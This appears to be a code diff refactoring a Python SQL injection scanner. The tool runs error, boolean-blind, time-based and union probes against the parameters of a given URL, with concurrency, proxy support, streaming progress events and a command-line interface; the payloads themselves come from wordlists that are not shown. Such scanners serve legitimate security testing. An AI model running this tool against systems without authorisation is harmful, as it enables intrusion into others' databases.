-                    "false_hash": fp_false[2],
-                    "true_len": fp_true[1],
-                    "false_len": fp_false[1],
-                    "diff_pct": round(len_diff_pct, 1),
+                    "type":       "boolean_diff",
+                    "true_hash":  fp_t[2],
+                    "false_hash": fp_f[2],
+                    "true_len":   fp_t[1],
+                    "false_len":  fp_f[1],
+                    "diff_pct":   round(len_diff_pct, 1),
                 }],
             )
         return None
 
     def _test_time_based(self, url: str, param: str,
-                          payloads: List[str]) -> Optional[Finding]:
+                         payloads: List[str]) -> Optional[Finding]:
         if self._baseline_time <= 0:
             return None
 
-        for payload in payloads[:20]:
+        for payload in payloads[:MAX_TIME_PAYLOADS]:
             if self._stop.is_set() or self._budget_exceeded():
                 return None
 
-            # First attempt
-            resp1 = self._send(url, param, payload)
+            r1 = self._send(url, param, payload)
             self._done += 1
-            if resp1 is None:
-                continue
-            delay1 = resp1["elapsed"] - self._baseline_time
+            if r1 is None: continue
+            delay1 = r1["elapsed"] - self._baseline_time
             if delay1 < TIME_DELAY_TOLERANCE:
                 continue
 
-            # Second attempt to confirm (avoid network jitter)
-            resp2 = self._send(url, param, payload)
+            r2 = self._send(url, param, payload)
             self._done += 1
-            if resp2 is None:
-                continue
-            delay2 = resp2["elapsed"] - self._baseline_time
+            if r2 is None: continue
+            delay2 = r2["elapsed"] - self._baseline_time
             if delay2 < TIME_DELAY_TOLERANCE:
                 continue
 
-            # Both attempts reproduced the delay
             avg_delay = (delay1 + delay2) / 2.0
             return Finding(
                 parameter=param,
                 technique="time-based",
                 payload=payload,
                 status="confirmed",
-                confidence=0.9,
+                confidence=0.90,
                 evidence=[{
-                    "type": "reproduced_delay",
-                    "baseline_s": round(self._baseline_time, 2),
-                    "attempt1_s": round(resp1["elapsed"], 2),
-                    "attempt2_s": round(resp2["elapsed"], 2),
+                    "type":        "reproduced_delay",
+                    "baseline_s":  round(self._baseline_time, 2),
+                    "attempt1_s":  round(r1["elapsed"], 2),
+                    "attempt2_s":  round(r2["elapsed"], 2),
                     "avg_delay_s": round(avg_delay, 2),
                 }],
             )
         return None
 
     def _test_union_based(self, url: str, param: str,
-                           payloads: List[str]) -> Optional[Finding]:
-        # Detect if any payload causes a length/status change from baseline
+                          payloads: List[str]) -> Optional[Finding]:
         if not self._baseline_fp:
             return None
         base_status, base_len, base_hash = self._baseline_fp
 
-        for payload in payloads[:30]:
+        for payload in payloads[:MAX_UNION_PAYLOADS]:
             if self._stop.is_set() or self._budget_exceeded():
                 return None
             resp = self._send(url, param, payload)
             self._done += 1
-            if resp is None:
-                continue
-            if resp["status"] != base_status:
-                continue
-            if resp["status"] >= 500:
-                continue
+            if resp is None: continue
+            if resp["status"] != base_status: continue
+            if resp["status"] >= 500: continue
 
-            # Union often produces a distinct response size/hash
             cur_fp = _body_fingerprint(resp["status"], resp["body"])
-            if cur_fp[2] == base_hash:
-                continue
-            if cur_fp[1] == base_len:
-                continue
+            if cur_fp[2] == base_hash: continue
+            if cur_fp[1] == base_len: continue
 
-            # Confirm by repeating
             resp2 = self._send(url, param, payload)
             self._done += 1
-            if resp2 is None:
-                continue
+            if resp2 is None: continue
             cur_fp2 = _body_fingerprint(resp2["status"], resp2["body"])
-            if cur_fp2[2] != cur_fp[2]:
-                continue
+            if cur_fp2[2] != cur_fp[2]: continue
 
             return Finding(
                 parameter=param,
@@ -877,28 +955,28 @@ class SqliScanner:
                 status="probable",
                 confidence=0.75,
                 evidence=[{
-                    "type": "union_response_diff",
-                    "baseline_len": base_len,
-                    "response_len": cur_fp[1],
+                    "type":          "union_response_diff",
+                    "baseline_len":  base_len,
+                    "response_len":  cur_fp[1],
                     "response_hash": cur_fp[2],
                 }],
             )
         return None
 
-    # ── Full scan ──────────────────────────────────────────────────────
+    # ── full scan ─────────────────────────────────────────────────────
     def scan(self, url: str, *,
              params: Optional[List[str]] = None,
              techniques: Optional[List[str]] = None,
-             max_params: int = DEFAULT_MAX_PARAMS) -> ScanReport:
+             max_params: int = DEFAULT_MAX_PARAMS,
+             mode: str = "auto") -> ScanReport:
         started = datetime.now(timezone.utc)
         self._started_mono = time.monotonic()
-        report = ScanReport(url=url, started_at=started.isoformat())
+        report = ScanReport(url=url, started_at=started.isoformat(), mode=mode)
 
-        # Wordlist loading
-        error_pls = load_wordlist("sqli_error_based.txt", 60) or _BUNDLED_ERROR
-        time_pls = load_wordlist("sqli_time_based.txt", 40) or _BUNDLED_TIME
-        union_pls = load_wordlist("sqli_union_select.txt", 40) or _BUNDLED_UNION
-        true_pls = _BUNDLED_BOOLEAN_TRUE
+        error_pls = load_wordlist("sqli_error_based.txt", MAX_ERROR_PAYLOADS) or _BUNDLED_ERROR
+        time_pls  = load_wordlist("sqli_time_based.txt",  MAX_TIME_PAYLOADS)  or _BUNDLED_TIME
+        union_pls = load_wordlist("sqli_union_select.txt", MAX_UNION_PAYLOADS) or _BUNDLED_UNION
+        true_pls  = _BUNDLED_BOOLEAN_TRUE
         false_pls = _BUNDLED_BOOLEAN_FALSE
 
         techniques = techniques or ["error", "boolean", "time", "union"]
@@ -922,7 +1000,7 @@ class SqliScanner:
             report.elapsed = time.monotonic() - self._started_mono
             return report
 
-        # WAF detection
+        # WAF
         report.waf_detected = _detect_waf(
             dict(self._session.headers), self._baseline_body
         )
@@ -931,35 +1009,42 @@ class SqliScanner:
         self._done = 0
 
         findings: List[Finding] = []
+        seen_keys: Set[Tuple[str, str, str]] = set()
         findings_lock = threading.Lock()
+
+        def _add(f: Finding) -> None:
+            key = (f.parameter, f.technique, f.db_hint or "")
+            if key in seen_keys:
+                return
+            seen_keys.add(key)
+            findings.append(f)
 
         def worker(param: str) -> None:
             if self._stop.is_set() or self._budget_exceeded():
                 return
-            local_findings: List[Finding] = []
+            local: List[Finding] = []
+            try:
+                if "error" in techniques:
+                    f = self._test_error_based(url, param, error_pls)
+                    if f: local.append(f)
 
-            if "error" in techniques:
-                f = self._test_error_based(url, param, error_pls)
-                if f:
-                    local_findings.append(f)
+                if "boolean" in techniques:
+                    f = self._test_boolean_blind(url, param, true_pls, false_pls)
+                    if f: local.append(f)
 
-            if "boolean" in techniques:
-                f = self._test_boolean_blind(url, param, true_pls, false_pls)
-                if f:
-                    local_findings.append(f)
+                if "time" in techniques:
+                    f = self._test_time_based(url, param, time_pls)
+                    if f: local.append(f)
 
-            if "time" in techniques:
-                f = self._test_time_based(url, param, time_pls)
-                if f:
-                    local_findings.append(f)
-
-            if "union" in techniques:
-                f = self._test_union_based(url, param, union_pls)
-                if f:
-                    local_findings.append(f)
+                if "union" in techniques:
+                    f = self._test_union_based(url, param, union_pls)
+                    if f: local.append(f)
+            except Exception as e:
+                logger.debug("[sqli] worker(%s) raised: %s", param, e)
 
             with findings_lock:
-                findings.extend(local_findings)
+                for f in local:
+                    _add(f)
 
             self._emit(f"{param}")
 
@@ -969,21 +1054,18 @@ class SqliScanner:
             futures = [pool.submit(worker, p) for p in params]
             for fut in concurrent.futures.as_completed(futures):
                 if self._stop.is_set() or self._budget_exceeded():
-                    for f in futures:
-                        f.cancel()
+                    for f in futures: f.cancel()
                     break
-                try:
-                    fut.result()
-                except Exception:
-                    continue
+                try: fut.result()
+                except Exception: continue
 
-        # Sort: highest confidence first
         findings.sort(key=lambda f: -f.confidence)
-        report.findings = findings
-        report.vulnerable = any(f.confidence >= 0.7 for f in findings)
-        report.requests_sent = self._req_count
-        report.finished_at = datetime.now(timezone.utc).isoformat()
-        report.elapsed = time.monotonic() - self._started_mono
+        report.findings       = findings
+        report.vulnerable     = any(f.confidence >= 0.7 for f in findings)
+        report.requests_sent  = self._req_count
+        report.finished_at    = datetime.now(timezone.utc).isoformat()
+        report.elapsed        = time.monotonic() - self._started_mono
+        report.cancelled      = self._stop.is_set()
         self._emit("complete")
         return report
 
@@ -995,16 +1077,12 @@ def _normalise_options(options: Optional[Dict[str, Any]]) -> Dict[str, Any]:
     options = options or {}
 
     def _i(key, default, lo, hi):
-        try:
-            return max(lo, min(hi, int(options.get(key, default))))
-        except (TypeError, ValueError):
-            return default
+        try: return max(lo, min(hi, int(options.get(key, default))))
+        except (TypeError, ValueError): return default
 
     def _f(key, default, lo, hi):
-        try:
-            return max(lo, min(hi, float(options.get(key, default))))
-        except (TypeError, ValueError):
-            return default
+        try: return max(lo, min(hi, float(options.get(key, default))))
+        except (TypeError, ValueError): return default
 
     return {
         "techniques":    options.get("techniques") or ["error", "boolean", "time", "union"],
@@ -1017,20 +1095,25 @@ def _normalise_options(options: Optional[Dict[str, Any]]) -> Dict[str, Any]:
         "method":        (options.get("method") or "GET").upper(),
         "headers":       options.get("headers") or None,
         "cookies":       options.get("cookies") or None,
+        "proxies":       options.get("proxies") or None,
         "cancel_event":  options.get("cancel_event"),
         "progress_cb":   options.get("progress_cb"),
     }
 
 
+def _normalise_url(url: str) -> str:
+    url = (url or "").strip()
+    if not url:
+        raise ValueError("url is required")
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+    return url
+
+
 def run(url: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
     """Blocking SQLi scan. Returns the report as a dict."""
     o = _normalise_options(options)
-
-    if not url or not url.strip():
-        raise ValueError("url is required")
-    url = url.strip()
-    if not url.startswith(("http://", "https://")):
-        url = "http://" + url
+    url = _normalise_url(url)
 
     scanner = SqliScanner(
         timeout=o["timeout"],
@@ -1042,6 +1125,7 @@ def run(url: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
         method=o["method"],
         headers=o["headers"],
         cookies=o["cookies"],
+        proxies=o["proxies"],
     )
     report = scanner.scan(
         url,
@@ -1049,12 +1133,7 @@ def run(url: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
         techniques=o["techniques"],
         max_params=o["max_params"],
     )
-    public = report.to_public_dict()
-    return {
-        **public,
-        "mode": "auto",
-        "findings_count": len(public["findings"]),
-    }
+    return report.to_public_dict()
 
 
 def scan_single(url: str, param: str,
@@ -1062,17 +1141,23 @@ def scan_single(url: str, param: str,
                 ) -> Optional[Dict[str, Any]]:
     """Scan a single parameter directly."""
     o = _normalise_options(options)
-    o["params"] = [param]
+    o["params"]     = [param]
     o["max_params"] = 1
     result = run(url, o)
     return result["findings"][0] if result["findings"] else None
 
 
 def run_streaming(url: str,
-                   options: Optional[Dict[str, Any]] = None,
-                   cancel_event: Optional[threading.Event] = None
-                   ) -> Iterator[Dict[str, Any]]:
-    """Yield SSE-friendly events, then the final report."""
+                  options: Optional[Dict[str, Any]] = None,
+                  cancel_event: Optional[threading.Event] = None
+                  ) -> Iterator[Dict[str, Any]]:
+    """
+    Yield SSE-friendly events:
+        start / progress / result / error / heartbeat
+
+    Cancellation: pass a ``cancel_event``; the caller closing the
+    generator will also request cancellation.
+    """
     o = _normalise_options(options)
     if cancel_event is not None:
         o["cancel_event"] = cancel_event
@@ -1080,26 +1165,26 @@ def run_streaming(url: str,
     events: List[Dict[str, Any]] = []
     events_lock = threading.Lock()
     done = threading.Event()
+    holder: Dict[str, Any] = {}
 
     def _progress(done_count: int, total: int, label: str) -> None:
         pct = int((done_count / total) * 100) if total else 0
         with events_lock:
             events.append({
-                "type": "progress",
-                "done": done_count,
-                "total": total,
+                "type":    "progress",
+                "done":    done_count,
+                "total":   total,
                 "percent": pct,
-                "label": label,
+                "label":   label,
             })
 
     o["progress_cb"] = _progress
-    result_holder: Dict[str, Any] = {}
 
     def _worker() -> None:
         try:
-            result_holder["result"] = run(url, o)
-        except Exception as e:  # noqa: BLE001
-            result_holder["error"] = str(e)
+            holder["result"] = run(url, o)
+        except Exception as e:
+            holder["error"] = str(e)
         finally:
             done.set()
 
@@ -1107,8 +1192,8 @@ def run_streaming(url: str,
                      name=f"sqli-{url[:32]}").start()
 
     yield {
-        "type": "start",
-        "url": url,
+        "type":    "start",
+        "url":     url,
         "options": {
             "techniques": o["techniques"],
             "max_params": o["max_params"],
@@ -1116,60 +1201,74 @@ def run_streaming(url: str,
         },
     }
 
+    last_heartbeat = time.monotonic()
     while not done.is_set():
         with events_lock:
             pending, events[:] = list(events), []
         for ev in pending:
             yield ev
-        done.wait(timeout=0.4)
+        if done.wait(timeout=0.4):
+            break
+        now = time.monotonic()
+        if now - last_heartbeat >= 10.0:
+            last_heartbeat = now
+            yield {"type": "heartbeat", "elapsed": round(now - last_heartbeat, 1)}
 
     with events_lock:
         for ev in events:
             yield ev
 
-    if "error" in result_holder:
-        yield {"type": "error", "message": result_holder["error"]}
+    if "error" in holder:
+        yield {"type": "error", "message": holder["error"]}
     else:
-        yield {"type": "result", "data": result_holder.get("result", {})}
+        yield {"type": "result", "data": holder.get("result", {})}
 
 
 # ═══════════════════════════════════════════════════════════════════════════
 # CLI
 # ═══════════════════════════════════════════════════════════════════════════
-if __name__ == "__main__":
-    import argparse
-    import json
-    import sys
-
+def _cli() -> int:
     logging.basicConfig(
         level=logging.INFO,
         format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
     )
 
-    p = argparse.ArgumentParser(description="SQLi Engine v1.0.0")
-    p.add_argument("url", help="URL with parameters (e.g. https://example.com/?id=1)")
+    p = argparse.ArgumentParser(
+        description=f"SQLi Engine v{__version__}",
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+    )
+    p.add_argument("url", nargs="?", help="URL with parameters (e.g. https://example.com/?id=1)")
     p.add_argument("--techniques", default="error,boolean,time,union",
                    help="comma-separated: error,boolean,time,union")
-    p.add_argument("--max-params", type=int, default=10)
-    p.add_argument("--concurrency", type=int, default=8)
-    p.add_argument("--rate-limit", type=float, default=20.0)
-    p.add_argument("--json", action="store_true")
+    p.add_argument("--max-params",  type=int,   default=10)
+    p.add_argument("--concurrency", type=int,   default=8)
+    p.add_argument("--rate-limit",  type=float, default=20.0)
+    p.add_argument("--timeout",     type=float, default=DEFAULT_TIMEOUT)
+    p.add_argument("--max-duration",type=float, default=DEFAULT_MAX_DURATION)
+    p.add_argument("--method", default="GET", choices=["GET", "POST"])
+    p.add_argument("--json",   action="store_true")
     p.add_argument("--stream", action="store_true")
     p.add_argument("--wordlists", action="store_true",
                    help="print wordlist metadata and exit")
+    p.add_argument("--version", action="version", version=__version__)
     args = p.parse_args()
 
     if args.wordlists:
         print(json.dumps(ensure_wordlists(), indent=2))
-        sys.exit(0)
+        return 0
+
+    if not args.url:
+        p.error("url required")
 
     techniques = [t.strip() for t in args.techniques.split(",") if t.strip()]
-
     options = {
         "techniques":   techniques,
         "max_params":   args.max_params,
         "concurrency":  args.concurrency,
         "rate_limit":   args.rate_limit,
+        "timeout":      args.timeout,
+        "max_duration": args.max_duration,
+        "method":       args.method,
     }
 
     if args.stream:
@@ -1179,18 +1278,19 @@ if __name__ == "__main__":
                 print(f"[start] {ev['url']}  techniques={ev['options']['techniques']}")
             elif t == "progress":
                 print(f"[{ev['percent']:3d}%] {ev['done']}/{ev['total']}  {ev['label']}")
+            elif t == "heartbeat":
+                print(f"[heartbeat] elapsed={ev['elapsed']}s")
             elif t == "result":
                 if args.json:
                     print(json.dumps(ev["data"], indent=2))
             elif t == "error":
                 print(f"[ERROR] {ev['message']}", file=sys.stderr)
-        sys.exit(0)
+        return 0
 
     report = run(args.url, options)
-
     if args.json:
         print(json.dumps(report, indent=2))
-        sys.exit(0 if report["vulnerable"] else 1)
+        return 0 if report["vulnerable"] else 1
 
     print()
     print("═" * 72)
@@ -1203,16 +1303,22 @@ if __name__ == "__main__":
     print(f"  Elapsed           : {report['elapsed']}s")
     if report.get("waf_detected"):
         print(f"  WAF               : {report['waf_detected']}")
+    if report.get("cancelled"):
+        print("  Note              : cancelled")
     print()
-
     if report["findings"]:
         for f in report["findings"]:
             print(f"  [{f['status'].upper():10s}] [{f['technique']:14s}] "
                   f"param={f['parameter']:20s} conf={f['confidence']}")
             print(f"              payload: {f['payload'][:80]}")
             if f.get("db_hint"):
-                print(f"              db: {f['db_hint']}")
+                print(f"              db     : {f['db_hint']}")
             print()
     else:
         print("  No SQL injection detected.")
     print()
+    return 0 if report["vulnerable"] else 1
+
+
+if __name__ == "__main__":
+    sys.exit(_cli())
